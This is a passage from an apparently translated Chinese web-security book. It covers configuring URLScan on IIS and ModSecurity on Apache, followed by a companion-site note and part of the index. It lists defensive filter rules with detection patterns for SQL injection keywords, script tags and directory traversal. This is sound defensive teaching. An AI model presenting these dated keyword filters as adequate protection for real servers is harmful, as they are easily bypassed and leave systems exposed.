break-word;'>260/260</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>AllowRestrictedChars</td><td style='text-align: center; word-wrap: break-word;'>十六进制转义符</td><td style='text-align: center; word-wrap: break-word;'>0/0</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>PercentUAlowed</td><td style='text-align: center; word-wrap: break-word;'>URL 中的 %uNNNN 符号</td><td style='text-align: center; word-wrap: break-word;'>1/0</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>EnableNonUTF8</td><td style='text-align: center; word-wrap: break-word;'>非 UTF-8 编码 URL，ANSI 或双字节字符集（DBCS）</td><td style='text-align: center; word-wrap: break-word;'>1/1</td></tr></table>

### C.1.3 管理 URLScan

一旦你安装并运行 URLScan，它基本上可以自动完成扫描的任务，除了少数例外。第一，如果你需要改变你的 URLScan 备注（通过更新 UrlScan.ini 配置文件），你必须重启 IIS 使得新的设置生效。我们将在本节中重述微软重启 IIS 的步骤，以及设置 URLScan ISAPI

过滤的优先级和删除 URLScan 时需要注意的事项。

##### 重载 URLscan

像 URLScan 这样的 ISAPI 过滤器，仅在 IIS 启动时加载到内存中，因此每次你修改UrlScan.dll 或 UrlScan.ini 时，都必须重启 IIS。通常，URLScan 安装程序为你执行该操作，但你必须留意下面这几点以防万一。

在 IIS 4 上，你需要手动停止和启动需要 URLScan 保护的每个 IIS 服务。一般情况下，这些仅仅是 WWW 或者 W3SVC 的服务，可以通过输入如下的命令来停止它们：

net stop w3svc /Y

要启动 W3SVC 服务，再输入:

net start w3svc

在 IIS 5 或更新的版本中，可以使用 iisreset 命令。简单地在命令行中输入 iisreset，所有的 IIS 服务都会被重启。下面是一个简单的批处理文件，可以干净利落地停止 IIS 服务，备份 W3SVC 日志，并再次启动 IIS。

@@echo off
IISRESET /STOP /NOFORCE
if errorlevel == 1 goto EXIT
copy %systemroot%\system32\LogFiles\W3SVC1 d:\backup\W3SVC1
IISRESET /START
:EXIT

如果你想优雅地重启 IIS，该脚本是很有用的。

#### 调整 URLScan 优先级

一般情况下，你不需要调整 URLScan ISAPI 过滤器的优先级（该优先级定义了 ISAPI 过滤器对请求的处理顺序）。下面的指南只在极少需要的情况下采用。

在 IISAdmin 工具中打开 ISAPI 过滤器界面，如图 C-7 所示。如果 URLScan 不是在该列表的顶部，并且没有高优先级，那么你应该考虑对它进行修改。URLScan 应该在所有的请求被传递给其他所有 DLL 前截获它们，以禁止对这些 DLL 的恶意请求。使用该界面左边的箭头按钮来调整 URLScan 的优先级，直到它与图 C-7 一样。

有些时候 URLScan 不应该被第一个加载，应该由 Web 服务器上运行的产品决定。到目前为止，我们知道的唯一例外是使用 FrontPage 服务器扩展（FrontPage Server Extensions，FPSE）。在这种情况下，你需要将 URLScan 过滤器移动到 FPSE ISAPI 过滤器（fpexedll.dll）之下，并把它的优先级改为低优先级。

 </div>

##### 禁用 URLscan

如果你的确需要禁止 URLScan，有以下的一些方法可供选择。

如果在你安装了 URLScan 之后，你的 Web 应用开始去弁一些特定的客户请求，你可以设置 URLScan 为 logging-only 模式，这种模式会允许所有的请求通过，但是将记录通常情况下会被拒绝的所有请求。这对解决问题是很有帮助的。要将 URLScan 设置成 logging-only 模式，可以在 UrlScan.ini 中的 RejectResponseUrl 一行添加 “/~*”，就像下面这样：

RejectResponseUrl=/~*

然后重启 IIS 来加载新的配置。

如果你只是想简单地禁止 URLScan，你可以卸载 ISAPI 过滤器。在 IISAdmin 控制台中，于 ISAPI 过滤器面板上简单地选择 URLScan 过滤器，并单击“删除”按钮（或者在 IIS 6 上单击“禁用”按钮），然后重启 IIS。这不会删除 URLScan.dll 或 URLScan.ini。要重新启用 URLScan，你要么运行安装程序（如果你下载了 URLScan 的一个更新版本），要么通过回溯上面的流程，重新手动启用 URLScan ISAPI，

### C.2 MoD Security

ModSecurity 执行了与 URLScan 类似的安全方法, 但是是在 Apache Web 服务器上执行。

URLScan 和 ModSecurity 之间的另一个关键不同是可扩展性。URLScan 提供相对固定的保护功能，而 ModSecurity 的目的是提供可扩展的规则引擎，用来创建复杂的结构，这些结构启用诸如日志、实时流量监测（Web 入侵检测）和预防性的“soft patching”功能。ModSecurity 仍然在更新中，我们期望在将来的发布版本中看到更新颖的功能。

本节将叙述 ModSecurity 的基本安装和配置。关于更高级的信息，请参见本章末尾的“参考和进一步阅读”。

### C.2.1 ModSecurity 安装

ModSecurity 可以作为动态库编译或者静态编译进 Apache Web 服务器。更容易和更好的方法是将其编译成一个模块。把它作为一个模块编译，使得更新 ModSecurity 更容易，因为不需要重新编译整个 Apache 代码。要将 ModSecurity 编译成一个模块，请运行如下的命令：

apxs -i -a -c mod_security.c

这条命令应该足够了，因为在大多数情况下，apxs 工具会复制 ModSecurity.so 文件到正确的位置，并升级 Web 服务器的 httpd.conf 配置文件（如果失败，会报告错误消息）。

如果需要，你可以用如下命令手动配置.so 文件：

cp mod_security.so /path/to/apache/libexec/mod_security.so
chmod 755 /path/to/apache/libexec/mod_security.so
如果手动配置 httpd.conf，则需要插入下面这行命令：
LoadModule security_module libexec/mod_security.so.
当然，Apache 需要重新启动才能遵循新的配置：
apachectl stop
apachectl start

### C.2.2 ModSecurity 配置

通过编辑 httpd.conf 文件中 <IfModule mod_security.c> </IfModule> 部分的配置指令可以设置 ModSecurity（很像使用 UrlScan.ini 来配置 URLScan）。ModSecurity 提供了一个例样配置，并且提供了一个很好的初始模板。本节的剩余部分将简单介绍 ModSecurity 配置指令，也会给出我们所建议的设置。我们围绕着 ModSecurity 提供的基本过滤指令来展开讨论（指令启用了 ModSecurity 的大部分安全功能），一般的安全指令影响整个 Web 服务器的安全，管理指令指明关于 ModSecurity 本身的逻辑配置。

注意 除了在此列出的这些指令，ModSecurity 还拥有许多其他的配置指令。我们建议读者到 ModSecurityWeb 站点的公开的描述中寻找更多的文档。

提示 ModSecurity 规则项目提供了非常棒的预写好的规则集，它们会随着 ModSecurity 2.0 版本而发布。

##### 过滤指令

和 URLScan 一样, ModSecurity 提供的主要好处之一是它为 Web 应用提供的过滤功能。下面我们列出了 ModSecurity 中的关键过滤指令，以及我们推荐的设置。

SecFilterEngine（On/Off）启用或禁用 ModSecurity。在例样脚本中设置成了 On。

SecFilterDefaultAction（action，log，status）提供当请求匹配时采取的动作列表。默认的“reject”动作是“deny，log，status:403”，这会使引擎记录匹配的规则并用403状态码拒绝该请求。在每个规则匹配时都会执行该动作。我们推荐至少使用上述的字符串。

SecFilterScanPOST（On/Off）启用/禁用扫描 POST 数据。默认配置是启用（On），这也是我们所推荐的。

SecFilterCheckURLEncoding（On/Off）启用/禁用传输 URL 编码字符。就像我们在第 6 章和第 12 章中见到的那样，攻击者经常使用 URL 编码攻击来绕过输入验证或躲避入侵检测。ModSecurity 检查提供的所有编码，以确认只发送了合法的字符。该指令在默认情况下是启用的，也应该保持启用。

SecFilterCheckUnicodeEncoding（On/Off）启用/禁用传输 UTF-8 编码字符集。就像我们在第 6 章和第 12 章中见到的那样，Unicode 是攻击者最常使用的编码诡技之一。SecFilterCheckUnicodeEncoding 检查一个 UTF 编码字符串是否为固定的字节数，以及是否存在非法的编码和过长的字符集。在默认情况下，该指令是禁用的，我们推荐启用它。

SecFilterForceByteRange（lower,upper）在请求中限制字节的范围。默认的 ASCII 字符范围是从 1 到 255。不过将其设置成从 32 到 126 会更安全些，因为它剔除了在缓冲区溢出攻击中，发送的“随机”二进制内容经常包含的 ASCII 字符。

SecFilterSelective（location，keyword，actions）一个高级过滤指令。该指令让你配置在什么地方执行搜索。SecFilterSelective 指令带有三个参数，LOCATION KEYWORD [ACTIONS]。LOCATION 参数应该是一系列位置标识符，KEYWORD 是一个正则表达式，ACTION 代表当条件匹配时应该采取什么动作。Action 参数可以是首要、次要或流程类型。首要动作是指明请求是否继续的唯一类型。首要动作可以是拒绝、通过或重定向。次要动作在主要动作过滤器的结果上执行。可以有任意数目的次要动作。比如，exec 是一个次要

动作。最后，流程动作可以改变规则的流程，因此导致过滤器忽略规则或转移到另一个规则。举个例子，流程动作可以是 chain 或 skip。因为 SecFilterSelective 有些难以理解，我们将在下面提供几个例子。

SecFilterSelective 的例子 接下来显示的 SecFilterSelective 配置例子，只接受 application/x-www-form-urlencoded 和 multipart/formdata 编码类型的请求，其他的请求都会被丢弃。另外，第一个规则指明了可以用来传递这些编码类型的方法，就是 GET 和 HEAD 方法。除了它们，所有其他的方法都被拒绝。参数链指明了接下来的 SecFilterSelective 指令是一个流程动作，流程动作指明了该动作从先前的 SecFilterSelective 指令继续。

SecFilterSelective REQUEST_METHOD "!^(GET|HEAD)$" chain
SecFilterSelective HTTP_Content-Type
"! (^application/x-www-form-urlencoded$|^multipart/form-data;) "

和前一个例子类似,下面的 SecFilterSelective 指令指明了使用的是 GET 和 HEAD 方法,指令是一个流程动作,要求不得提供内容的长度。

SecFilterSelective REQUEST_METHOD "^(GET|HEAD)$" chain
SecFilterSelective HTTP_Content-Length "!^$"

下一个 SecFilterSelective 指令例子指明了只能使用 POST 方法，指令是一个流程动作，要求必须提供内容长度。

SecFilterSelective REQUEST_METHOD "^POST$" chain
SecFilterSelective HTTP_Content-Length "^$"

这两个 HTTP_Content-Length 表达式之间有非常细微的差别。两个正则表达式之间只相差一个感叹号：“!^$”和“^$”。^字符表示一个字符串的开始，$字符表示一个字符串的结束。在^$前面的!字符表示“not ^$”，这意味着该参数必须为空。

SecFilterSelective HTTP_Transfer-Encoding '!^$' 指令表示引擎不接受任何编码。

其他一些针对 Web 应用程序的常见攻击，包括目录遍历攻击，可以使用 SecFilter 指令来防范，在应对目录遍历攻击时，必须为 SecFilter 指令提供 “\\./” 作为参数。

为 SecFilter 指令提供“<script”和“<.+>”标记可以抵御基本的跨站脚本攻击。“<script>过滤器能防范输入字段中的脚本标记的 JavaScript 注入，“<.+>”禁止以输入字段中任何 HTML 代码作为参数。

SQL 注入攻击也可以通过使用 SecFilter 指令来滤除。将 delete、insert 和 select 等指令作为参数提供给 SecFilter，可以截取并丢弃这些指令。举个例子，下面的标记将保证带有 delete、insert 和 select 的 SQL 语句不会被执行。

SecFilter "delete.+from"

SecFilter "insert.+into"
SecFilter "select.+from"
SecFilter "drop[[:space:]]+table.+"
SecFilter "drop[[:space:]]+DATABASE.+"

##### 其他安全指令

到目前为止，我们已经讨论了 ModSecurity 中的过滤指令。本节将讲述影响安全的其他类型指令，它们的功能不仅仅是过滤输入。

chroot 是一种将进程限制在文件系统中单独的子集的方法。为了建立一个 chroot 环境，需要很多步骤。但是，有了 ModSecurity，可以很容易地建立 chroot。SecChrootDir 指令可以用来建立 chroot。

SecChrootDir /chroot/apache

不像通常的 chroot，ModSecurity 版本的 chroot 不需要库。只是必须将 Web 应用需要的文件放在 chroote Web 的根目录中。

##### 管理指令

到现在，我们已经讨论了 ModSecurity 中关键的过滤器和面向安全的一般指令。下面是一些我们认为重要的应该提到的“管理”指令：

SecUploadDir（路径） ModSecurity 上传文件到该指令指定的临时文件夹。我们推荐把该目录放在 Web 根目录之外，这样 Web 服务器用户可以访问，但 Web 应用程序用户不能访问。

SecUploadKeepFiles（On/Off） 控制上传到 Web 服务器的文件是否保留。

SecFilterDebugLevel（0-3） 默认是禁用（设成 0），也应该设成这样。参数的范围从 0 到 3。3 代表非常详细的调试。相关的 SecFilterDebugLog 指令的参数是日志文件的位置。

SecAuditEngine（On/Off/RelevantOnly） 控制所有会话的额外日志记录。最好保持它为（RelevantOnly），因为这只会记录感兴趣的会话，因此不会很快就将日志填满。另一方面，我们发现 DynamicOrRelevant（SecAuditEngine 设置）和 DynamicOnly（SecFilterEngine 设置）对用户太难了，不赞成使用。

SecAuditLogRelevantStatus（正则表达式） 默认是禁用。该指令可以记录错误代码在特定范围内的所有错误。举个例子，如果你希望记录 5xx 范围里的所有错误（Web 服务器自身的内部错误），那么用正则表达式^5 来设置 SecAuditLogRelevantStatus，就可以记录所有来自服务器带有 500+ 错误代码的响应。记录下来的信息非常详细，不过除非你需要取证，我们推荐保持它为禁用，

SecAuditLog（路径） ModSecurity 日志文件的位置。如果该参数没有以反斜线开始，

那么日志文件保存在 Apache 主路径下的目录中。为了增强性能和增加所记录信息的数量，也为了允许实时审计日志集（在发布中包含了概念验证管道日志脚本，modsec-auditlog-collector.pl），ModSecurity 1.9 引入了一个新的审计记录类型（每个交互创建一个文件，避免同时发生的请求之间的写入同步）。这个新的审计日志类型可以记录 HTTP 响应体，在以前的版本中是没有这个功能的。

### C.3 小结

URLScan 和 ModSecurity 分别为运行在 IIS 5.x（或更早）和 ApacheWeb 服务器上的 Web 应用程序提供了强有力的和可扩展的安全保护。它们通过过滤和/或解码输入、限制请求中最大数量数据、以及限制包含常见滥用扩展名和方法的需求，来防范一些针对 Web 应用的常见攻击。在适合时，也可以把它们配置成记录拒绝的请求，来给出调试信息或者辨认分析（虽然在默认情况下我们不推荐启用日志功能）。

这些工具如果被正确地配置了，可以成为管理员强有力的盟友，但是不能把它们当作是我们在本书其他部分提到的很多安全最佳措施的替代物，比如建立额外的外部防火墙限制、安全补丁的良好维护、勤勉的服务器配置和管理、以及安全编程实践。和任何很好的安全工具一样，它们只是 Web 应用程序之外的保护层，该保护层提供了坚实的“深度防御”。

### C.4 参考和进一步阅读

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>参</td><td style='text-align: center; word-wrap: break-word;'>考</td><td style='text-align: center; word-wrap: break-word;'>链接</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>URLScan 主页</td><td colspan="2">http://www.microsoft.com/technet/security/tools/urlscan.mspx</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>URLScan 下载</td><td colspan="2">http://www.microsoft.com/downloads/, 搜索“urlscan”, 选择最新的发布日期</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ModSecurity 主页</td><td colspan="2">http://www.modsecurity.org/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>IIS Lockdown</td><td colspan="2">http://www.microsoft.com/technet/security/tools/locktool.mspx</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>URLScan 和 IIS Lockdown 基础</td><td colspan="2">http://www.securityfocus.com/infocus/1755</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>IIS 目录遍历漏洞</td><td colspan="2">http://www.microsoft.com/technet/security/bulletin/MS00-078.mspx</td></tr><tr><td colspan="3">448</td></tr></table>

## 附录 D 关于本书的配套网站

在这个如此多变和高速发展的 Web 安全领域, 一部关于 Web 攻击的书如果没有配套的 Web 站点为读者提供更新, 实在是说不过去。读者在 http://www.webhackingexposed.com 站点上可以查找如下的信息（和更多的信息）, 我们会定期更新。

新闻和公告 像博客一样的页面，内容是关于当前 Web 应用安全相关事件的新闻、分析和评论，也有关于本书的公告。

作者论坛 通过 E-mail 把你的想法、评论和问题直接发送给作者。我们会挑选有意义的问题会和我们的回复一起公布在站点上。

链接 以超链接形式提供本书中所有的链接，使你轻轻点击就可以访问几百个和 Web 应用安全相关的资源和工具。在这里我们仍不断加入在我们的研究和咨询工作中遇到的新的链接。

工具和脚本 在这里，你可以找到本书中讨论过的作者定制的工具和脚本，它们都可以被下载。

内容列表 完整的内容列表在这里公布，包括章和节，以及到内部和外部资源的超链接。

勘误 人无完人，我们也是这样。为了尽量提供最准确的信息，我们在这里发布相关的勘误。

评论 来自不同 Web 和其他媒体对本书的评论都可以在这里找到。

## 索引

war 文件，.war files，85

“隐藏”资源，hidden resources，169

##### A

ActiveX, 344

Acunetix Enterprise Web 漏洞扫描器(WVS) 3.0, Acunetix Enterprise Web Scanner (WVS) 3.0, 443-444

Apache

Apache Benchmark, 114-115, 116

application-layer DoS, 373-375

ASP.NET, 授权, ASP.NET, authorization, 204-205

安全 security

安全 Shell (SSH), Secure Shell (SSH), 295

安全开发生命周期(SDL), Security Development Lifecycle (SDL), 427

安全拷贝(scp), Secure Copy (scp), 297

安全强化机制(ESC), Enhanced Security Configuration (ESC), 360

案例分析, 授权攻击, case studies, authorization attacks, 185-199

##### B

banner 获取，banner grabbing, 29-30

Base64, 165-166

BEAWebLogic 远程管理功能，BEA WebLogic Remote Administration

Black Widow, 70

BroadVision, 71–72

Brutus, 126–128

Burp Intruder, 21–22

Burp Suite 1.01, 451–453

白盒, white box, 398

帮助文件, helper files, 49–50

包含文件, include files

保护模式(PMIE), Protected Mode IE (PMIE), 360

暴力攻击, brute-force attacks, 127, 182–183

边界参数, bound parameters, 263–264

边界检查, boundary checks, 224–225

编码滥用, encoding abuse, 228–229

表单, forms, 54–56

隐藏的表单字段, form fields, hidden, 172, 173

表格, matrices, 41–42, 43

补丁, 安全, patches, security, 102–103

捕获/重放, capture/replay, 184

##### C

CACLS, 108-109

Cenzic Hailstorm 3.0, 444-445

chrooting Apache, 112-113

CONNECT 命令, CONNECT command, 37

CookieSpy, 176-177

COTS 会话 ID, COTS session IDs, 162

Curl, 23

踩点, footprinting, 28-29

草根的支持, cultural buy-in, 428

层, tiers, 6-7

查询, queries, 4

查询字符串, query strings

差异分析, differential analysis, 161, 166, 194-196

超长的数据包，oversized packets, 369

超级代理，mega-proxies, 385

超级全局变量，superglobal variables, 229-230

充分认知分析，full-knowledge analysis, 398

初始序列号。参见 ISN, initial sequence numbers. See ISNs

垂直权限提升，vertical privilege escalation, 191-194

##### D

DISCO, 277-279

DREAD 系统，潜在损失、重现、利用、影响用户和发现能力，Damage potential，Reproducibility，Exploitability，Affected users and Discoverability，DREAD system，405

代码分析，工具，code analysis，tools，474

代码评审，code review，407

低权限浏览，low-privilege browsing，359-360

点击式的漏洞利用，point-and-click exploitation，81-84

钓鱼，phishing，346-348

动态生成页面，dynamically generated pages，43-45

##### E

二进制分析，binary analysis，414

##### F

F5 TrafficShield, 39

FFsniFF, 343

Fiddler, 19–21

fpse2000ex.exe, 300–301

FP 服务器扩展, FP Server Extensions, FPSEs, 298–300

Fraggle, 372

FrontPage, 298–300

FTP, 297

反钓鱼工作小组(APWG), Anti-Phishing Working Group, 346

反向代理, reverse proxies, 36–37

防火墙，firewalls，384-385

访问/会话令牌，识别，access/session tokens，identifying，162-164

访问控制列表，ACLs，160

分布式拒绝服务攻击，Distributed DoS (DDoS) attacks，372-373

分号字符，semicolons，227-228

风险，risk，405

服务器，servers，4

负载均衡器，load balancers，385-386

##### G

Google 2004 年 7 月的 DDoS 攻击，Google July 2004 DoS，375–376 GUI web 攻击，GUI web hacking，2–3

概率，probability，405

个人可标识信息(PII)，personally identifiable information (PII)，361

管道字符I，pipe characters，227–228

管理员功能，不安全的，admin functions，insecure，194

广告软件，Ad-aware，352

广告软件，adware，350–353

##### H

Hailstorm 3.0, 444-445

HTTP/S proxy, tools, 472

httpprint 工具, httpprint tool, 32

HTTP 代理, HTTP proxies, 17-18

HTTP 响应截断, HTTP response splitting, 212-213

红色代码蠕虫, Code Red worm, 104

后端访问点, backend access points, 60

缓冲区溢出攻击, buffer overflow attacks, 213-215

缓存设备, caching devices, 386

换行符, newline characters, 227

会话 ID, session IDs, 162-164

会话定置, session fixation, 184-185

会话管理，session management，7，476

会话劫持，session hijacking，147

会话令牌，session tokens

活动脚本，Active Scripting，342-343

# 1

IE Headers, 14

IEWatch, 14, 15

IIS 5.x 与 IIS 6.0 服务器名远程欺骗，Remote IIS 5.x and IIS 6.0 server name spoof, 96-98

IP 地址，授权，IP address，authorization，201-202

IIS Lockdown, 107–108, 485–490, 505–506

ISNs，初始序列号 initial sequence numbers ISNs 179-182

##### J

JMeter, 390-391

击破编码，encoding，defeating，165-166

机器人，bots，372-373

基础认证，Basic authentication，130-132

基于表单攻击，forms-based attacks，134-139

加密，crypto，166

加密，encryption，265

架构剖析，infrastructure profiling，28-40

间谍软件，spyware，350-353

检测绕过，evading detection

僵尸，zombies，372-373

僵尸网络，botnets，373

角色矩阵，role matrix，167-168

劫持账户，hijacked accounts，193

结构化查询语言 Structured Query Language, SQL, 236-237

进行剖析的搜索工具，search tools，for profiling，60-65

静态页面，static pages，43-45

镜像，mirroring，43

拒绝服务攻击，DoS attacks，368

##### K

kill-bits, 345

开发者造成的错误，developer-driven mistakes, 321-327

客户端分析，工具和技术，client-side analysis，tools and techniques, 482

空格定界符，space delimiters, 246-247

跨站脚本，cross-site scripting, 221-222

跨站脚本，XSS, 221-222

扩展。参见 browser extensions 浏览器扩展，xtensions. See browser extensions

##### L

Last-Modified, 34–35

LiveHTTPHeaders, 14–16

LMZ, 攻击, LMZ, attacking, 339–341

Location 头, Location headers, 75

Lotus Domino, 74

Lupper 蠕虫, Lupper worm, 90

Lynx, 66–68

利用客户端, client-side piggybacking, 152

连接字符&, ampersands, 227–228

令牌攻击, 手动预测, token attacks, manual prediction, 170–178

令牌重放, token replay, 147–148

浏览器, browsers, 12–13, 472

浏览器辅助对象(BHO), Browser Helper Object (BHO), 352

浏览器扩展, browser extensions, 12

流程图, flowcharts, 42, 43

漏洞利用, exploitation

##### M

Metasploit 框架，Metasploit Framework，81-84

Microsoft Access 数据库和 SQL 注入，Microsoft Access Database，and SQL injection，256

Microsoft Passport, 142–146

Microsoft SQL Server 和 SQL 注入，Microsoft SQL Server，and SQL injection，256–260

Modify Headers, 16–17

ModSecurity, 500

MySQL 和 SQL 注入，MySQL，and SQL injection，260

枚举文件，enumerating files, 218–220

密码，passwords

命令行工具，command-line tools, 473

模糊测试，fuzzing, 424

目录遍历，directory traversal, 169

目录猜测，directory guessing, 312–314

目录服务，directory services

##### N

Netcontinuum, 39

Nimda 蠕虫，Nimda worm，104

nonce, 132-133

N-Stalker N-Stealth 5.8, 450-451, 452

nukers, 369

##### O

Offline Explorer Pro, 70, 161–162, 163

Ollydbg, 417–420

open proxies, 472

OpenSSL ASN.1 解析错误 DoS, OpenSSL ASN.1 parsing errors DoS, 379–380

Oracle 和 SQL 注入, Oracle, and SQL injection, 260–261

Oracle 应用程序服务器, Oracle Application Server, 71

OWASP WebScarab, 18–19, 20

##### P

Paros 代理，Paros Proxy，18，19

PassMark/SiteKey，140-141

Passport, 142–146

PEAR/PHP XML-RPC 代码执行，PEAR/PHP XML-RPC code execution, 90–92

PeopleSoft, 72–74

PHP 远程包含，PHP remote inclusion, 93–95

Plupii 蠕虫，Plupii worm, 90

爬行，crawling

爬行 ACLs, crawling ACLs, 161–162

骗取收入的攻击，denial-of-revenue attacks, 380–383

剖析，profiling

##### Q

嵌入式脚本，embedded scripts, 222-223.

窃听和重放攻击，eavesdropping and replay attacks, 130-134

请求方法，methods, 5

请求头，headers, 5

全局变量，global variables, 229-230

##### R

Referer 头，Referer headers, 174-175

RevertToSelf 调用，RevertToSelf calls, 110

robots .txt 文件，robots.txt, 63-65

RSS, 8

绕过认证，令牌重放，bypassing authentication, token replay, 147-148

认证，authentication, 7

日志，安全，logs, security, 205-206

蠕虫 worms

入侵检测系统，intrusion detection systems, 392

##### S

SecureIIS, 40

SecurityChecker 2.0, 453-455

Smurf, 372

SoapClient.com, 271

SPI Dynamics WebInspect 5.8, 448–449

Spike Web Proxy, 424–425

Spybot Search and Destroy, 352–353

SpySweeper, 352

SQL Server，系统表对象，system table objects，SQL Server 259-260

SSH2, 297

SQL 注入，SQL injection，226

SSH 安全 Shell, SSH, 295

SuExec, 113

Syhunt Sandcat Suite 1.6.2.1, 447-448

SYN floods, 370–371

SYNDefender, 384

散列算法，hashing algorithms，133

扫描，scanning

扫描器，scanners，436-437

身份管理，identity management，148

设计中的问题，跨域访问，design liabilities，cross-domain access，338-339

社会工程学，social engineering，346

身份窃取，identity theft，153

渗透测试，penetration testing，426-427

渗透测试，pen-testing，426-427

时间戳分析，timestamps，analysis，34

时间攻击和用户名枚举，timing attacks，and username enumeration，124

实现中的漏洞，implementation vulnerabilities，333-334

使用 TRACK 隐藏请求，TRACK，hiding requests using，100-101

使用超长 URL 绕过日志记录，log evasion using long URLs，99-100

手工漏洞利用，manual exploitation，84

受限制的站点，restricted sites，357-358

受信任站点，trusted sites，356

授权，authorization，7，160-161

授权管理器，Authorization Manager，AzMan，204

输入验证，input validation，210

数据存储攻击，datastore attacks，226，261-265

数据库加密，database encryption，265

数据库配置，database configuration，265

数据流程图 data flow diagrams，DFDs，400-401，402

数据执行保护功能 Data Execution Prevention，DEP，430-431

数字边界，分析，numeric boundaries，analyzing，166，167

数字证书，digital certificates，139

水平权限提升，horizontal privilege escalation，186-191

搜索引擎，search engines，225-226

##### T

TamperData, 16, 17

TamperIE, 13-14

Teleport Pro, 69

Telnet, 294-295

Teros, 38-39

TRACE 请求, TRACE requests, 36-37

提示, tips, 76-77

调试, debugging, 417-420

挑战-应答认证模型, challenge-response authentication model, 132

通用漏洞分级评价体系(CVSS), Common Vulnerability Scoring System (CVSS), 405

通用漏洞分级评价体系 2.0, Compuware DevPartner Security Checker 2.0, 453-455

统一资源标识符, URIs, 3-4

##### U

UDDI 统一描述、发现和集成协议 Universal Description, Discovery, and Integration, UDDI, 275-277

UDP floods, 371-372

URI 攻击，URI hacking, 3-4

URLScan, 39-40, 108, 484-485

User-Agent 头，User-Agent headers, 172-173

##### W

Watchfire AppScan 6, 449-450, 451

Watchfire PowerTools, 22–23

Web 服务，web services，8

WebCracker, 126, 127

WebInsta 邮件列表管理器，WebInsta Mailing List manager，94-95

WebScarab, 18–19, 20

WebService Studio, 271

WebSphere, 74

Web 分布式创作和版本控制 Web Distributed Authoring and Versioning, WebDAV, 8

Web 浏览器，web browsers，12-13，472

Web 内容管理，web content management，297

Web 平台，web platforms，80

Web 认证服务，web authentication services，142-146

Web 应用安全扫描器，web application security scanners，436-437

Web 应用攻击，web app hacking

本书相关的 Web 站点，web site，companion to this book，508

Wget, 68-69

Windows Defender, 352

Windows OneCare, 352

WSDigger, 271

WSDL, 271–274

WS-Security, 288–290

外部实体攻击，external entity attacks，283-285

网络访问控制，network access control，102

网站时光倒流机器方法，Wayback Machine method，315-319

威胁建模，threat modeling，398-400

位翻转，bit flipping，183-184

文件扩展名，file extensions，47-48

文件泄漏，file disclosure，312-319

现成软件，COTS，80

#### X

XML，安全，XML，security，288

XML 用户界面语言(XUL)，XML User Interface Language (XUL)，344-345

XPath 注入攻击，XPath injection attacks，285-287

信息泄漏，文件、路径和用户泄漏，information leakage, file, path, and user disclosure, 312–320

虚警，false positives，457

虚拟服务器，virtual servers，33

许可，使用 Curl 映射，permissions，using Curl to map，196–199

##### Y

一次性密码，one-time passwords，141-142

异步 Javascript 和 XML AJAX, Asynchronous JavaScript and XML, 8

隐藏的表单字段，hidden form fields，172，173

应用剖析，application profiling，40-41

影响，impact，405

映射许可，mapping permissions，196-199

映射许可，mapping permissions，196-199

用户可改变角色，user-modifiable roles，192-193

用户枚举，user enumeration，319

用户名/密码威胁，username/password threats

用户名枚举，username enumeration，122-124

用户注册攻击，user registration attacks，149-151

用以区分电脑与人类的完全自动化公开图灵测试 Completely Automated Public Turing Test

to Tell Computers and Humans Apart, CAPTCHAs, 129

远程服务器管理，remote server management，294，295-296

##### Z

在源代码中放置私密信息，source code，putting private data in，103

摘要认证，Digest authentication，132-134

账户锁定和用户名枚举，account lockout，and username enumeration，124

针对 HTTP 头的手动篡改攻击，HTTP headers，manual tampering attacks against，172-175

针对 POST 数据的手动篡改攻击，POST data，manual tampering attacks against，171-172

真人互动校对（HIP），Human Interactive Proof (HIP)，382-383

证书管理攻击，credential management attacks，152

执行命令，command execution，226-228

指纹识别，fingerprinting，30-32

注册和用户名枚举，registration，and username enumeration，123

注释，comments，52-53

转义攻击（点点斜线），canonicalization (dot-dot-slash)，215-220

状态页面信息泄漏，status page information leakage, 320-321

资源路径，paths，4

字典攻击，dictionary attacks，126-127，182-183

自启动扩展点（ASEPs），autostart extensibility points (ASEPs)，351-352

自身引用的数据包循环，self-referenced packet loops，369

最流行的免费 Web 应用，freeware，most popular，48

组合，combos，369

